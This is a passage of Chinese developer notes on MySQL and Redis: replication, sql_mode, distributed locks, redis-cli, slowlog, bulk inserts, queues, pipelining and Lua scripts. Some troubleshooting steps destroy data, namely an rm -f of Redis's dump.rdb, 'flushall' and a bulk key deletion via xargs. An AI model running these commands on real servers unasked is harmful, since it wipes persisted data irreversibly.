master_password=''命令不在这个范畴中。这也就意味着MySQL5.6中仍然使用这样的语法来启动replication时有安全风险的。这也就是为什么5.6中使用带有明文密码的change master to时会有warning提示，具体如下：slave1 [localhost] &#123;msandbox&#125; ((none)) &gt; change master to master_host='127.0.0.1',master_port =21288,master_user='rsandbox',master_password='rsandbox',master_auto_position=1;Query OK, 0 rows affected, 2 warnings (0.04 sec)slave1 [localhost] &#123;msandbox&#125; ((none)) &gt; show warnings;+-------+------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Level | Code | Message |+-------+------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Note | 1759 | Sending passwords in plain text without SSL/TLS is extremely insecure. || Note | 1760 | Storing MySQL user name or password information in the master info repository is not secure and is therefore not recommended. Please consider using the USER and PASSWORD connection options for START SLAVE; see the 'START SLAVE Syntax' in the MySQL Manual for more information. |+-------+------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+2 rows in set (0.00 sec) 导出表数据1234567select * from table into outfile "/home/root/example.sql" where +条件导入数据库$ mysqldump -uroot -p --default-character-set=utf8 dbname tablename &gt; /home/root/example.sql转载数据load data local infile "/home/table.txt" into table `table`; 从数据库中获取随机的数据1234567891011121314151617181920212223User::inRandomOrder()-&gt;get();User::inRandomOrder()-&gt;first();User::orderByRaw("RAND()")-&gt;get();use Illuminate\Database\Query\Builder;//https://learnku.com/laravel/wikis/16199Builder::macro('orderByRandom', function () &#123; $randomFunctions = [ 'mysql' =&gt; 'RAND()', 'pgsql' =&gt; 'RANDOM()', 'sqlite' =&gt; 'RANDOM()', 'sqlsrv' =&gt; 'NEWID()', ]; $driver = $this-&gt;getConnection()-&gt;getDriverName(); return $this-&gt;orderByRaw($randomFunctions[$driver]);&#125;);SELECT FROM table AS t1 JOIN (SELECT ROUND(RAND() ((SELECT MAX(id) FROM table)-(SELECT MIN(id) FROM table))+(SELECT MIN(id) FROM table)) AS id) AS t2WHERE t1.id &gt;= t2.idORDER BY t1.id LIMIT 1;以前用过的，效率不错。 mysql5.7 datetime 默认值为‘0000-00-00 00:00:00’值无法创建问题解决12345678910111213141516171819202122231、使用root登陆数据库 命令界面执行select @@sql_mode; 结果中包含下面两个NO_ZERO_IN_DATE,NO_ZERO_DATE2、修改/etc/my.cnf，查找sql_model如果找不到则添加如下代码 sql_mode="ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"3、重启mysql/etc/ini.d/mysql restart简单几步大功告成！ http://118.25.60.91:9080/article/15 https://learnku.com/articles/16807原因：NO_ZERO_IN_DATE,NO_ZERO_DATE是无法默认为‘0000-00-00 00:00:00’的根源。NO_ZERO_IN_DATE：在严格模式下，不允许日期和月份为零 NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告。 Redis 分布式锁1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071/** * * redis 加锁 --单Redis实例实现分布式锁 * * -- 分布式请使用：Redlock:https://github.com/ronnylt/redlock-php * -- 详情参考： http://www.redis.cn/topics/distlock.html * * @package app\common\service */class RedisLock&#123; const LOCK_SUCCESS = 'OK'; const IF_NOT_EXISTS = 'NX'; const MILLISECOND_EXPIRE_TIME = 'PX'; const EXPIRE_TIME = 60000; // millisecond =&gt; 60s const LOCK_VALUE = 1; /** * 加锁https://learnku.com/articles/15825/redis-distributed-lock-solution * @param $redis object * @param $key * @param string $expire_time 60000 */ public static function lock($redis, $key, $expire_time='') &#123; if (empty($expire_time)) &#123; $expire_time = self::EXPIRE_TIME; &#125; $result = $redis-&gt;set($key, self::LOCK_VALUE, [self::IF_NOT_EXISTS, self::MILLISECOND_EXPIRE_TIME =&gt; $expire_time]); return self::LOCK_SUCCESS === (string)$result; &#125; /** * 解锁https://github.com/laravel/framework/blob/5.6/src/Illuminate/Cache/RedisLock.php#L36 * * 参考： https://github.com/phpredis/phpredis/blob/develop/tests/RedisTest.php * @param $redis * @param $key */ public static function unlock($redis, $key) &#123; $lua =&lt;&lt;&lt;EOTif redis.call("get",KEYS[1]) == ARGV[1] then return redis.call("del",KEYS[1])else return 0endEOT; $result = $redis-&gt;eval($lua, array($key, self::LOCK_VALUE), 1); return $result; &#125;&#125;public function acquire() &#123; $result = $this-&gt;redis-&gt;setnx($this-&gt;name, 1); if ($result === 1 &amp;&amp; $this-&gt;seconds &gt; 0) &#123; $this-&gt;redis-&gt;expire($this-&gt;name, $this-&gt;seconds); &#125; return $result === 1; &#125; /** * Release the lock. * * @return void */ public function release() &#123; $this-&gt;redis-&gt;del($this-&gt;name); &#125; redis-cli123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106//https://juejin.im/book/5afc2e5f6fb9a07a9b362527/section/5bcfd27051882577e962f064$ redis-cli incrby foo 5(integer) 5$ redis-cli incrby foo 5(integer) 10$ redis-cli info &gt; info.txt$ wc -l info.txt 120 info.txt// -n 2 表示使用第2个库，相当于 select 2$ redis-cli -h localhost -p 6379 -n 2 pingPONG$ cat cmds.txtset foo1 bar1set foo2 bar2set foo3 bar3......$ cat cmds.txt | redis-cliOKOKOK$ redis-cli &lt; cmds.txtOKOKOK// 间隔1s，执行5次，观察qps的变化$ redis-cli -r 5 -i 1 info | grep opsinstantaneous_ops_per_sec:43469instantaneous_ops_per_sec:47460如果将次数设置为 -1 那就是重复无数次永远执行下去。如果不提供 -i 参数，那就没有间隔，连续重复执行。在交互模式下也可以重复执行指令，形式上比较怪异，在指令前面增加次数127.0.0.1:6379&gt; 5 pingPONGPONGPONGPONGPONG# 下面的指令很可怕，你的屏幕要愤怒了127.0.0.1:6379&gt; 10000 info$ redis-cli rpush lfoo a b c d e f g(integer) 7$ redis-cli --csv lrange lfoo 0 -1"a","b","c","d","e","f","g"$ redis-cli hmset hfoo a 1 b 2 c 3 d 4OK$ redis-cli --csv hgetall hfoo"a","1","b","2","c","3","d","4"$ redis-cli --csv -r 5 hgetall hfoo"a","1","b","2","c","3","d","4""a","1","b","2","c","3","d","4""a","1","b","2","c","3","d","4""a","1","b","2","c","3","d","4""a","1","b","2","c","3","d","4"127.0.0.1:6379&gt; eval "return redis.pcall('mset', KEYS[1], ARGV[1], KEYS[2], ARGV[2])" 2 foo1 foo2 bar1 bar2OK127.0.0.1:6379&gt; eval "return redis.pcall('mget', KEYS[1], KEYS[2])" 2 foo1 foo21) "bar1"2) "bar2"redis-cli --stat 参数来实时监控服务器的状态，间隔 1s 实时输出一次。$ ./redis-cli --bigkeys -i 0.01--bigkeys 参数可以很快扫出内存里的大 KEY，使用 -i 参数控制扫描间隔，避免扫描指令导致服务器的 ops 陡增报警。$ redis-cli --host 192.168.x.x --port 6379 monitor1539853410.458483 [0 10.100.90.62:34365] "GET" "6yax3eb6etq8:&#123;-7&#125;"1539853410.459212 [0 10.100.90.61:56659] "PFADD" "growth:dau:20181018" "2klxkimass8w"如果你想观察主从服务器之间都同步了那些数据，可以使用 redis-cli 模拟从库。$ ./redis-cli --host 192.168.x.x --port 6379 --slaveSYNC with master, discarding 51778306 bytes of bulk transfer...$ ./redis-cli --host 192.168.x.x --port 6379 --rdb ./user.rdbSYNC sent to master, writing 2501265095 bytes to './user.rdb' 远程 rdb 备份只有query执行时间大于slowlog-log-slower-than的才会定义成慢查询，才会被slowlog进行记录。slowlog-log-slower-than设置的单位是微秒，默认是10000微秒，也就是10毫秒。slowlog-max-len表示慢查询最大的条数，当slowlog超过设定的最大值后，会将最早的slowlog删除，是个FIFO队列。查看slowlog总条数127.0.0.1:6379&gt; SLOWLOG LEN(integer) 4127.0.0.1:6379&gt; CONFIG GET slowlog-*1) "slowlog-log-slower-than"2) "100"3) "slowlog-max-len"4) "1024"127.0.0.1:6379&gt; SLOWLOG GET 11) 1) (integer) 26 // slowlog唯一编号id2) (integer) 1440057815 // 查询的时间戳3) (integer) 47 // 查询的耗时（微秒），如表示本条命令查询耗时47微秒4) 1) "SLOWLOG" // 查询命令，完整命令为 SLOWLOG GET，slowlog最多保存前面的31个key和128字符2) "GET" debug sleep阻塞了set命令，set命令的整体响应时间(R)是1530357微秒，而其服务时间(S)为8微秒，排队延迟(Q)为1530349微秒。 Session-1: xxxx:6386&gt; debug sleep 6 OK (6.00s) Session-2: xxxxx:6386&gt; set a b OK (1.53s) 127.0.0.1:6379&gt; SLOWLOG RESET OK 127.0.0.1:6379&gt; SLOWLOG LEN (integer) 0 redis-cli monitor打印出所有sever接收到的命令以及其对应的客户端地址 $ redis-cli monitor redis-cli --stat查看当前连接的客户端数，连接数等 按前缀/模式批量删除keys redis-cli keys david* | xargs redis-cli del 127.0.0.1:6379&gt; eval "local keys = redis.call('keys',KEYS[1]) for i,v in ipairs(keys) do redis.call('del',v) end" 1 david* 每个分组的最后一条记录123456select * from t_tmp group by FCityId order by FUpdateTime desc;` 结果却是错误的！http://blog.text.wiki/2015/04/03/retrieve-the-last-record-in-each-group.htmlSELECT * FROM (SELECT * FROM t_tmp ORDER BY FUpdateTime DESC)tmptable GROUP BY FCityId ORDER BY FUpdateTime DESC;SELECT m1. * FROM t_tmp m1 LEFT JOIN t_tmp m2 ON ( m1.FCityId = m2.FCityId AND m1.FId &lt; m2.FId ) WHERE m2.FId IS NULL ORDER BY FUpdateTime DESC LIMIT 0, 30; 超过经理收入的员工12345678 SELECT e.Name AS Employee FROM Employee e, Employee e1 WHERE e.ManagerId = e1.id AND e.Salary &gt; e1.Salary;Department Employee SalaryIT Max 90000Sales Henry 80000https://learnku.com/articles/24492 MySQL 之事务隔离级别123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354MySQL事务主要用于处理一个包含操作量比较大、复杂的业务。比如说，删除一个学生，我们除了要删除该学生的基本信息，同时也要删除考试记录、违规记录等。诸多的操作组成一个事务。事务是用来管理insert、update、delete基本指令的。当MySQL使用innodb引擎的前提下才支持事务操作https://learnku.com/articles/24581#topnav https://www.itcodemonkey.com/article/13020.html隔离性的类别read uncommitted | 读未提交read committed | 读已提交repeatable read | 可重复读serializable | 串行化在MySQL数据库中，引擎默认使用repeatable read# SELECT @@tx_isolation 或者 SELECT @@transaction_isolation# MySQL 8.x # transaction_isolation在MySQL 5.7.20中添加了作为别名 tx_isolation，现已弃用，并在MySQL 8.0中删除。# 应调整应用程序transaction_isolation以优先使用 tx_isolation。mysql&gt; SELECT @@transaction_isolation;+-------------------------+| @@transaction_isolation |+-------------------------+| REPEATABLE-READ |+-------------------------+1 row in set (0.01 sec)## 将事务隔离的模式设置为[可重复读]mysql&gt; set session transaction isolation level repeatable read;Query OK, 0 rows affected (0.00 sec)## (1)事务A读取scor数据表mysql&gt; select * from score;+----+----------+-------+| id | name | score |+----+----------+-------+| 1 | alicfeng | 75 || 2 | feng | 100 || 3 | alic | 90 |+----+----------+-------+3 rows in set (0.00 sec)## (2)事务B新增删除一条数据并提交mysql&gt; delete from score where id=1;Query OK, 1 row affected (0.01 sec)mysql&gt; commit;Query OK, 0 rows affected (0.01 sec)## (3)事务A再次读取score数据表mysql&gt; select * from score;+----+----------+-------+| id | name | score |+----+----------+-------+| 1 | alicfeng | 75 || 2 | feng | 100 || 3 | alic | 90 |+----+----------+-------+3 rows in set (0.00 sec) MySQL性能突发事件问题排查技巧1234567891011121314151617181920212223242526272829303132333435363738https://mp.weixin.qq.com/s/qCRfxIr1RoHd9i8-Hk8iuQtop — Linux 系统进程监控iostat vmstat — 虚拟内存统计[xxx@localhost ~]$ vmstatprocs -----------memory---------- ---swap-- -----io---- --system-- -----cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 0 0 945448 437836 618928 5950612 1 0 13 685 0 0 16 2 82 0 0 lsof — 打开文件列表 [finance@localhost ~]$ lsof -c php-fpm COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME php-fpm 3893 root cwd unknown /proc/3893/cwd (readlink: Permission denied) php-fpm 3893 root rtd unknown /proc/3893/root (readlink: Permission denied) php-fpm 3893 root txt unknown /proc/3893/exe (readlink: Permission denied) php-fpm 3893 root NOFD /proc/3893/fd (opendir: Permission denied) php-fpm 3894 root cwd DIR 8,2 4096 90113 /root php-fpm 3894 root rtd DIR 8,2 4096 2 / php-fpm 3894 root txt REG 8,7 37943970 264189 /data/php55/sbin/php-fpmtcpdump — 网络数据包分析器netstat — 网络统计 监控网络数据包传入和传出的统计界面的命令行工具[XXX@localhost ~]$ netstat -a |moreActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address Foreign Address Statetcp 0 0 127:6379 *:* LISTENtcp 0 0 localhost:6379 *:* LISTENtcp 0 0 localhost:9004 *:* LISTENSHOW PROCESSLIST; —当前MySQL数据库的运行的所有线程INNODB_TRX; — 当前运行的所有事务mysql&gt; select *from information_schema.INNODB_TRX\GINNODB_LOCKS; — 当前出现的锁select *from information_schema.INNODB_LOCKS\GINNODB_LOCK_WAITS; — 锁等待的对应关系计mysql&gt; select *from information_schema.INNODB_LOCK_WAITS\GSHOW OPEN TABLES where In_use &gt;0; — 当前打开表SHOW ENGINE INNODB STATUS \G; —Innodb状态SHOW STATUS LIKE 'innodb_row_lock_%'; — 锁性能状态SQL语句EXPLAIN; — 查询优化器 Mysql 批量写入数据1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859https://my.oschina.net/famoustone/blog/856736public function insertTest()&#123; set_time_limit(0); //防止超300s 500错误 $t1 = microtime(true); //随机插入num条 for ($i=1; $i&lt;=200000; $i++)&#123; $result = $this-&gt;db-&gt;insert('myisam', ['value' =&gt; uniqid().$i]); &#125; //程序运行时间 $t2 = microtime(true); echo '耗时：'.round($t2-$t1,3).'秒&lt;br&gt;'; echo '内存消耗：'.round(memory_get_usage()/1048576,2)." M&lt;br/&gt;"; &#125; 167秒，时间20w 数据 Myisam要 接近3分钟了。 my.cnf 当innodb_flush_log_at_trx_commit=2时, 每次事务提交时, MySQL会把log buffer的数据写入log file, 但 不会主动触发flush(刷新到disk)操作同时进行. 然而, MySQL会每秒执行一次flush(刷新到disk)操作.public function insertTest()&#123; set_time_limit(0); //防止超300s 500错误 $t1 = microtime(true); $sql = "insert into innodb (value) VALUES"; //随机插入num条 for ($i=1; $i&lt;=200000; $i++)&#123; $val = uniqid().$i; $sql .= "('&#123;$val&#125;'),"; &#125; $sql = substr($sql,0,-1); //程序运行时间 $t2 = microtime(true); echo '循环耗时：'.round($t2-$t1,3).'秒&lt;br&gt;'; $this-&gt;db-&gt;query($sql); //批量插入 $t3 = microtime(true); echo '插入耗时：'.round($t3-$t2,3).'秒&lt;br&gt;'; echo '内存消耗：'.round(memory_get_usage()/1048576,2)." M&lt;br/&gt;"; &#125;拼接语句可能会报错 设置一下 max_allowed_packet = 500M 允许mysql 接受数据包大小。 Redis延时队列123456789101112131415161718192021222324252627282930313233343536373839404142https://rsy.me/posts/redis-application-in-web-development/?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io$queueKey = "queue";// 生产者$redis-&gt;rpush($queueKey, $data)// 消费者while (true) &#123; $data = $redis-&gt;lpop($queueKey); if (null === $data) &#123; usleep(100000); continue; &#125; // 业务逻辑 ...&#125;$queueKey = "queue";// 生产消息// 消费时间, 这里设置为1小时候$consumeTimestamp = time() + 3600;// $data需要添加随机串前缀(or后缀)，防止出现重复member被丢弃$data = $data . md5(uniqid(rand(), true));$redis-&gt;zadd($queueKey, $consumeTimestamp, $data);// 消费消息while (tue) &#123; $arrData = $redis-&gt;zrangebyscore($queueKey, 0, time()); if (!$arrData) &#123; usleep(100000); continue; &#125; // 业务逻辑 foreach ($arrData as $data) &#123; $data = substr($data, 0, strlen($data) - 32); // 消费$data &#125;&#125; redis 分布式锁123456789101112131415161718192021222324252627282930313233343536373839$lockStatus = $redis-&gt;setnx($lockKey, 1);if (1 === $lockStatus) &#123; // 加锁成功，为锁设置超时时间 $redis-&gt;expire($lockKey, 300); // 进行后续操作&#125; elseif (0 === $lockStatus) &#123; // 加锁失败&#125; else &#123; // 其他异常&#125;$lockStatus = $this-&gt;redis-&gt;set($lockKey, 1, "EX", 30, "NX");if ("OK" === $lockStatus) &#123; // 加锁成功，可进行后续操作 //业务逻辑执行完毕，释放锁 $this-&gt;redis-&gt;del($lockKey);&#125; elseif (null === $lockStatus) &#123; // 加锁失败&#125;$lockToken = md5(uniqid(rand(), true));// 此处超时时间根据具体业务逻辑配置$expire = rand(280, 320);$lockStatus = $this-&gt;redis-&gt;set($lockKey, $lockToken, "EX", $expire, "NX");if ("OK" === $lockStatus) &#123; // 加锁成功，可进行后续操作 // 业务逻辑执行完毕，释放锁 // 删除锁之前需要判断是否是自己上的锁 $currentToken = $this-&gt;redis-&gt;get($lockKey); if ($currentToken === $lockToken) &#123; $this-&gt;redis-&gt;del($lockKey); &#125;&#125; elseif (null === $lockStatus) &#123; // 加锁失败&#125; redis 无法启动1234redis突然挂掉后，无法启动，查看log日志，发现报Short read or OOM loading DB. Unrecoverable error, aborting now[root@localhost ~]# rm -f /var/lib/redis/dump.rdb [root@localhost ~]# rm -f /var/run/redis.pid [root@localhost ~]# service redis start redis 导出 导入12345678910111213141516171819202122232425262728293031323334353637[root@localhost tank]# yum install ruby rubygems ruby-devel //安装rubygems 以及相关包 [root@localhost tank]# gem sources -a http://ruby.taobao.org/ //源，加入淘宝，外面的源不能访问 http://ruby.taobao.org/ added to sources [root@localhost tank]# gem install redis-dump -V //安装redis-dump 查看复制打印?[root@localhost tank]# telnet 127.0.0.1 6379 //telnet到redis Trying 127.0.0.1... Connected to 127.0.0.1. Escape character is '^]'. set test 11 //设置一个值 +OK get test //取值 $2 11 [root@localhost tank]# redis-dump -u 127.0.0.1:6379 &gt;test.json //导出数据 [root@localhost tank]# telnet 127.0.0.1 6379 //telnet到redis Trying 127.0.0.1... Connected to 127.0.0.1. Escape character is '^]'. flushall //请空所有数据 +OK keys * //查看已清空 http://blog.51yip.com/nosql/1656.html*0 [root@localhost tank]# &lt; test.json redis-load //导入数据 [root@localhost tank]# telnet 127.0.0.1 6379 Trying 127.0.0.1... Connected to 127.0.0.1. Escape character is '^]'. keys * //已导入成功 *1 $4 test 优化not in 和&lt;&gt;查询123456789101112131415161718192021222324http://fanqieto.top/2017/11/26/mysql%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/select customer_id,first_name,last_name,emailfrom customerwhere customer_idnot in (select customer_id from payment)改为：select a.customer_id,a.first_name,a.last_name,a.email from customer aleft join payment b on a.customer_id = b.customer_idwhere b.customer_id is null m使用汇总表优化查询例子select count(*) from product_comment where product_id = 999改为create table product_comment_cnt(product_id int, cnt int);select sum(cnt) from (select cnt from product_comment_cnt where product_id = 999union allselect count(*) from product_comment where product_id = 999and timestr &gt; date(now())) a Redis的n种妙用1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677setnx key value，当key不存在时，将 key 的值设为 value ，返回1。若给定的 key 已经存在，则setnx不做任何动作，返回0。当setnx返回1时，表示获取锁，做完操作以后del key，表示释放锁，如果setnx返回0表示获取锁失败# 实现方式一# 一直往list左边放lpush key value # key这个list有元素时，直接弹出，没有元素被阻塞，直到等待超时或发现可弹出元素为止，上面例子超时时间为10sbrpop key value 10 # 实现方式二rpush key valueblpop key value 10# 参加抽奖活动sadd key &#123;userId&#125; # 获取所有抽奖用户，大轮盘转起来smembers key # 抽取count名中奖者，并从抽奖活动中移除spop key count # 抽取count名中奖者，不从抽奖活动中移除srandmember key count# 1001用户给8001帖子点赞sadd like::8001 1001# 取消点赞srem like::8001 1001# 检查用户是否点过赞sismember like::8001 1001 # 获取点赞的用户列表smembers like::8001 # 获取点赞用户数scard like::8001 # 返回sevenSub和qingSub的交集，即seven和青山的共同关注sinter sevenSub qingSub -&gt; &#123;mic,james&#125;# 我关注的人也关注他,下面例子中我是seven# qing在micSub中返回1，否则返回0sismember micSub qingsismember jamesSub qing# 我可能认识的人,下面例子中我是seven# 求qingSub和sevenSub的差集，并存在sevenMayKnow集合中sdiffstore sevenMayKnow qingSub sevenSub -&gt; &#123;seven,jack&#125;# 将拯救者y700P-001和ThinkPad-T480这两个元素放到集合brand::lenovosadd brand::lenovo 拯救者y700P-001 ThinkPad-T480sadd screenSize::15.6 拯救者y700P-001 机械革命Z2AIRsadd processor::i7 拯救者y700P-001 机械革命X8TIPlus# 获取品牌为联想，屏幕尺寸为15.6，并且处理器为i7的电脑品牌(sinter为获取集合的交集)sinter brand::lenovo screenSize::15.6 processor::i7 -&gt; 拯救者y700P-001# user1的用户分数为 10zadd ranking 10 user1zadd ranking 20 user2# 取分数最高的3个用户zrevrange ranking 0 2 withscoresRedis 的持久化机制有两种，第一种是快照（RDB RDB是隔一段时间来备份数据），第二种是 AOF 日志。快照是一次全量备份，AOF 日志是连续的增量备份。快照是内存数据的二进制序列化形式，在存储上非常紧凑，而 AOF 日志记录的是内存数据修改的指令记录文本。AOF 日志在长期的运行过程中会变的无比庞大，数据库重启时需要加载 AOF 日志进行指令重放，这个时间就会无比漫长。所以需要定期进行 AOF 重写，给 AOF 日志进行瘦身。假如客户端每秒发送5000个请求，其中4000个为黑客的恶意攻击，即在数据库中也查不到。举个例子，用户id为正数，黑客构造的用户id为负数，如果黑客每秒一直发送这4000个请求，缓存就不起作用，数据库也很快被打死。如何解决缓存穿透查询不到的数据也放到缓存，value为空，如set -999 “”总而言之，缓存雪崩就是缓存失效，请求全部全部打到数据库，数据库瞬间被打死。缓存穿透就是查询了一个一定不存在的数据，并且从存储层查不到的数据没有写入缓存，这将导致这个不存在的数据每次请求都要到存储层去查询，失去了缓存的意义https://www.itcodemonkey.com/article/12951.html 防止库存超卖1234567891011121314151617181920212223242526272829303132333435https://www.fanhaobai.com/2017/09/record-question-1.html$num = $redis-&gt;incr($key);if ($num &lt; $max) &#123; //入抢购成功队列，异步去执行抢购成功逻辑&#125; else &#123; //不好意思呢，已经被抢完了&#125;不知道你有没有闻到这段代码的坏味道，在大部分情况下会如你所想地运行，但是特殊场景下会 出现判断失效 的逻辑问题，例如：1、key 由于某些原因失效了；2、Incr 操作失败了，不会抛异常并返回 false；通过日志定位到 Incr 操作问题，便 Telnet 连接到线上 Redis 服务，发现了异常情况：# 查看值GET key100# 尝试修改INCR keyREADONLY You can't write against a read only slaveINFO# Replicationrole:slave可以看出来，该连接的机器目前处于从机状态，不可写操作，所以 Incr 操作返回 false，同时 PHP 不同类型比较会存在隐式转化，所以false &lt; $num恒成立，导致计数器失效。增加计数器容错处理：$num = $redis-&gt;incr($key);if ($num &gt; 0 &amp;&amp; $num &lt; $max) &#123; //入抢购成功队列，异步去执行抢购成功逻辑&#125; else &#123; //不好意思呢，已经被抢完了&#125;然后，切换 Redis 源到高可用集群（Codis），测试并重新上线，第二日的抢购已经正常，看着 Cat 上流量逐渐平稳，心里也踏实了。 Redis管道提升性能1234567891011121314151617181920212223242526272829303132333435Redis 的 管道 （pipelining）是用来打包多条无关命令批量执行，以减少多个命令分别执行带来的网络交互时间。在一些批量操作数据的场景，使用管道可以显著提升 Redis 的读写性能https://www.fanhaobai.com/2017/08/redis-pipelining.html# 安装nc命令$ yum install nc# nc打包多个命令$ (printf "PING\r\nPING\r\nPING\r\n") | nc localhost 6379# 响应+PONG+PONG+PONG$start = nowTime();foreach (range(1, 1000) as $id) &#123; $user[] = $redis-&gt;hgetAll($keyPrex.$id);&#125;echo '时间：', nowTime() - $start, 'ms', PHP_EOL;时间：39ms$start = nowTime();$redis-&gt;multi(Redis::PIPELINE);foreach (range(1, 1000) as $id) &#123; //返回资源id相同的socket资源，并未执行命令 $redis-&gt;hgetAll($keyPrex.$id); &#125;$user = $redis-&gt;exec();echo '时间：', nowTime() - $start, 'ms', PHP_EOL;时间：6ms在批量操作（查询和写入）数据时，我们应尽量避免多次跟 Redis 的网络交互。这时，可以使用管道实现，也可以 Redis 内嵌 Lua 脚本实现。需要注意的是：管道只适用于无因果关联的多命令操作，否则就需要借助 Lua 脚本实现批量操作；在实际应用中，Redis 往往不可能是单机部署，如果想要在集群中使用管道，可以部署为一主多从架构，此时所有节点的数据都一致，随机选取节点使用管道即可；总结在批量获取数据时，尽管使用 Redis 的管道性能会显著提升，但是使用管道时 Redis 会缓存之前命令的结果，最后一并输出给终端，因此所打包的命令不宜太多，否则内存使用会很严重。 处理重复数据1234567891011121314151617181920212223242526272829303132333435CREATE TABLE `allowed_user`( `id` INT(10) UNSIGNED AUTO_INCREMENT PRIMARY KEY, `uid` VARCHAR(36) DEFAULT '' NOT NULL, `last_time` TIMESTAMP NOT NULL, UNIQUE (uid))INSERT INTO `allowed_user` (`uid`, `last_time`) VALUES ('8e9b8c14-fae8-49d4-bbac-a733c09ec82f', '2017-09-03 19:31:15')REPLACE INTO `allowed_user` (`uid`, `last_time`) VALUES ('8e9b8c14-fae8-49d4-bbac-a733c09ec82f', '2017-09-01 19:31:15')注意执行影响行数为 2INSERT INTO `allowed_user` (`uid`, `last_time`) VALUES ('8e9b8c14-fae8-49d4-bbac-a733c09ec82f', '2017-09-01 19:31:15') ON DUPLICATE KEY UPDATE `last_time` = '2017-09-01 19:40:15'SQL 执行影响记录数为 2 条INSERT IGNORE INTO `allowed_user` (`uid`, `last_time`) VALUES ('8e9b8c14-fae8-49d4-bbac-a733c09ec82f', '2017-09-01 19:41:15')try &#123; $user = $model-&gt;query("SELECT * FROM `allowed_user` WHERE `uid` = '8e9b8c14-fae8-49d4-bbac-a733c09ec82f'"); if (user) &#123; $model-&gt;exec("UPDATE `allowed_user` SET `last_time` = '2017-09-01 19:50:15' WHERE `uid` = '8e9b8c14-fae8-49d4-bbac-a733c09ec82f'"); &#125; else &#123; $model-&gt;exec("INSERT INTO `allowed_user` (`uid`, `last_time`) VALUES ('8e9b8c14-fae8-49d4-bbac-a733c09ec82f', '2017-09-01 19:50:15'"); &#125;&#125; catch(Exception $e) &#123;&#125;这段代码通过程序逻辑去试图保证唯一性，但是在高并发情况下，并不能保证数据唯一性，因为不是原子性操作，修改后为：https://www.fanhaobai.com/2017/09/mysql-repetition-deal.htmltry &#123; $model-&gt;exec("INSERT INTO `allowed_user` (`uid`, `last_time`) VALUES ('8e9b8c14-fae8-49d4-bbac-a733c09ec82f', '2017-09-01 19:50:15') ON DUPLICATE KEY UPDATE `last_time` = '2017-09-01 19:50:15'");&#125; catch(Exception $e) &#123;&#125;替换掉异常数据的特殊换行符即可。UPDATE table_a SET uid = REPLACE(REPLACE(uid, CHAR(10), ''), CHAR(13), '');在 MySQL 中，CHAR(10) 和 CHAR(13) 分别代 换行符 和 回车符，这里都替换掉。 lua 抢购场景1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556$key = 'number:string';$redis = new Redis();$number = $redis-&gt;get($key);if ($number &lt;= 0) &#123; return 0;&#125;$redis-&gt;decr($key);return $number--;local key = 'number:string'local number = tonumber(redis.call("GET", key))if number &lt;= 0 then return 0endredis.call("DECR", key)return number--Redis 中嵌入 Lua 脚本，所具有的几个特性为：原子操作：Redis 将整个 Lua 脚本作为一个原子执行，无需考虑并发，无需使用事务来保证数据一致性；高性能：嵌入 Lua 脚本后，可以减少多个命令执行的网络开销，进而间接提高 Redis 性能；可复用：Lua 脚本会保存于 Redis 中，客户端都可以使用这些脚本；Redis 中执行 Lua 脚本都是以原子方式执行，所以是原子操作。另外，redis-cli 命令行客户端支持直接使用--eval lua_file参数执行 Lua 脚本。&gt; EVAL "return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;" 2 key1 key2 first second1) "key1"2) "key2"3) "first"4) "second"&gt; EVAL "return 3.333" 0(integer) 3&gt; EVAL "return 'fhb'" 0"fhb"&gt; EVAL "return &#123;'fhb', 'lw', 'lbf'&#125;" 01) "fhb"2) "lw"3) "lbf"&gt; EVAL "return false" 0(nil)&gt; EVAL "return true" 0(integer) 1通过 Lua 实现一个针对用户的 API 访问速率控制，Lua 代码如下：local key = "rate.limit:string:" .. KEYS[1]local limit = tonumber(ARGV[1])local expire_time = tonumber(ARGV[2])local times = redis.call("INCR", key)if times == 1 then redis.call("EXPIRE", key, expire_time)endif times &gt; limit then return 0endreturn 1KEYS[1] 可以用 API 的 URI + 用户 uid 组成，ARGV[1] 为单位时间限制访问的次数，ARGV[2] 为限制的单位时间。&gt; EVAL "return redis.call('SET', 'name', 'fhb')" 0&gt; EVAL "return redis.pcall('GET', 'name')" 0"fhb"https://www.fanhaobai.com/2017/09/lua-in-redis.html 缓存与数据库双写一致性问题1234567891011121314151617181920212223242526272829303132333435363738394041424344周所周知，在项目性能优化、提升的时候，我们引进了一个缓存的概念，即一款缓存数据的技术，项目在最初期架构规划时都会引进的一个组件。使用缓存有很多好处：加快请求的响应速度、减少数据库的交互与浪费大量的IO操作等，但是在某些场景下使用缓存也有可能会造成雪崩、剧透、数据不一致等问题，我们研究下使用缓存会导致有哪些数据不一致的情况发生以及在哪些场景会使用哪些具体的解决方案，首先我们必然还是会使用缓存的。缓存更新策略先更新数据库再更新缓存浪费资源每次去更新数据库再更新缓存都是需要申请CPU进行数据库的修改的，同时倘若数据的修改比较频繁以及数据的读操作却又比较少的时候，这种策略会导致出现冷数据的情况。数据脏读如果两个操作同时对数据进行操作时，举个栗子：线程A 